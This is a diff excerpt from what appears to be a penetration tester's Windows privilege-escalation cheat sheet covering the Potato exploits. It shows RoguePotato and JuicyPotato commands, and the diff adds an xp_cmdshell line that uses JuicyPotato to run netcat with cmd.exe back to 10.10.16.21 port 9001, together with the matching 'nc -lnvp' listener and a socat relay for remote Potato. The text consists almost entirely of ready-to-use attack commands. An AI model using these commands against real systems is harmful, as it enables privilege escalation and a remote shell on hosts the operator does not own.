@@ -225,7 +225,11 @@ C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
     http://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/
 
     .\JuicyPotato.exe -t * -p C:\users\userpool\desktop\start.bat -l 1338 -c '{d20a3293-3341-4ae8-9aaf-8e397cb63c34}'
-
+     
+    xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.16.21 9001 -e cmd.exe" -t *
+    
+    nc -lnvp 9001
+    
  # remoute Potato
 
         sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999  (10.10.11.231 -сервер)
